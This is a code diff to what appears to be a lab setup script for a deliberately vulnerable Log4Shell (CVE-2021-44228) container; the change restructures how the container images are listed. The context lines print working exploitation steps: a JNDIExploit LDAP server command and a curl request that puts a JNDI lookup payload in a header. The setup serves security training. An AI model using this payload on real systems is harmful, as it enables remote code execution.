@@ -118,6 +118,7 @@ def CreateDefault():
                     '2. Launch a malicious LDAP server using the command \n"java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888\"\n'
                     "3. Trigger the exploit using the command: curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'\n"
                     "4. Go to Containers, open the main container shell and check for the presence of the pwned file by doing ls /tmp")
+    '''
     images = {}
     images['main'] = {}
     images['main']['name'] = base
@@ -125,6 +126,15 @@ def CreateDefault():
     images['main']['ports'] = {"8080/tcp":8080} # Container port: Host port
     images['main']['download_link'] = None
     images['other'] = []
+    '''
+    images = []
+    main_image = {}
+    main_image['name'] = base
+    main_image['is_main'] = True
+    main_image['operating_system'] = "Alpine Linux-3.8.2"
+    main_image['ports'] = {"8080/tcp":8080} # Container port: Host port
+    main_image['download_link'] = None
+    images.append(main_image)
     cve = 'CVE-2021-44228'
     type = 'Remote Code Execution'
     sources = ['https://www.dynatrace.com/news/blog/what-is-log4shell/', 'https://en.wikipedia.org/wiki/Log4Shell', 'https://github.com/christophetd/log4shell-vulnerable-app']
